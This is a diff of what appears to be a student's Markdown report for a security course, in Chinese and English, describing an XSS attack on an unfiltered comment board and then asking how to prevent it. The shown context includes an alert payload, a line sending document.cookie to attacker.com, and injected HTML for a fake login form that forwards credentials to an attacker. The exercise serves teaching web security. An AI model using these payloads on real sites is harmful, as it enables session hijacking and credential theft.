@@ -398,7 +398,7 @@ Follow learning steps below to prepare your report:
     3. DOM 型 XSS（DOM-based XSS）：透過 JavaScript 在客戶端操作 DOM，進而執行惡意腳本。
        
 2. You are a hacker! Design and do a real XSS attack on a web system. Show us your work.  
->`假設有一個留言板系統，允許用戶發表評論，但未對輸入內容進行適當的過濾或轉義。`    
+### 假設有一個留言板系統，允許用戶發表評論，但未對輸入內容進行適當的過濾或轉義。   
 * 在留言區輸入以下 XSS 惡意腳本：     
 ```javascrpit
 alert('這是一個 XSS 攻擊！');
@@ -417,6 +417,7 @@ document.location='http://attacker.com/steal.php?cookie='+document.cookie;
         '<input type="submit" value="登入">' +
     '</form>';
 ```
+##### 這段腳本會修改頁面內容，顯示一個假的登入表單，當用戶輸入帳號密碼後，資料將發送到攻擊者的伺服器。
 3. Based on the scenario you did in the previous step, how could it be prevented?
 
 
